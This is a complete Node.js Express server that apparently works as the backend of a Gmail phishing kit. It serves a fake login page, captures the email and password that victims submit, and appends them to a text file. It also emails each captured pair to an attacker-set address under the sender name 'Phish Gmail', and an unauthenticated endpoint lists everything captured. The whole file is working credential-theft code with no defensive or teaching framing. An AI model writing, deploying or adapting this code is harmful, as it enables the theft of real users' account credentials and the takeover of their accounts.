const express = require('express');
const nodemailer = require('nodemailer');
const fs = require('fs');
const path = require('path');

const app = express();
app.use(express.json());

// Serve o login.html na raiz e em /login.html
const loginPath = path.join(__dirname, 'login.html');

app.get('/', (req, res) => {
  res.sendFile(loginPath);
});

app.get('/login.html', (req, res) => {
  res.sendFile(loginPath);
});

// Diretório de dados (volume montado)
const DATA_DIR = process.env.RAILWAY_VOLUME_MOUNT_PATH || path.join(__dirname, 'data');
if (!fs.existsSync(DATA_DIR)) {
  fs.mkdirSync(DATA_DIR, { recursive: true });
}
const CAPTURAS_FILE = path.join(DATA_DIR, 'capturas.txt');

app.post('/captura', async (req, res) => {
  const { email, password } = req.body;
  const timestamp = new Date().toISOString();

  // 1. Grava em arquivo persistente
  try {
    fs.appendFileSync(CAPTURAS_FILE, `${timestamp} | ${email} | ${password}\n`);
  } catch (err) {
    console.error('Erro ao gravar arquivo:', err.message);
  }

  // 2. Envia por e-mail via Nodemailer
  try {
    const transporter = nodemailer.createTransport({
      host: process.env.SMTP_HOST,
      port: parseInt(process.env.SMTP_PORT || '587'),
      secure: process.env.SMTP_SECURE === 'true',
      auth: {
        user: process.env.SMTP_USER,
        pass: process.env.SMTP_PASS
      }
    });

    await transporter.sendMail({
      from: `"Phish Gmail" <${process.env.SMTP_USER}>`,
      to: process.env.RECEIVER_EMAIL,
      subject: `Nova captura: ${email}`,
      text: `Data: ${timestamp}\nE-mail: ${email}\nSenha: ${password}`
    });
  } catch (err) {
    console.error('Erro ao enviar e-mail:', err.message);
  }

  res.status(200).json({ ok: true });
});

// Endpoint para verificar capturas (opcional)
app.get('/capturas', (req, res) => {
  try {
    const content = fs.readFileSync(CAPTURAS_FILE, 'utf-8');
    res.type('text/plain').send(content || 'Nenhuma captura ainda.');
  } catch {
    res.send('Nenhuma captura ainda.');
  }
});

const PORT = process.env.PORT || 3000;
app.listen(PORT, '0.0.0.0', () => console.log(`Servidor rodando na porta ${PORT}`));
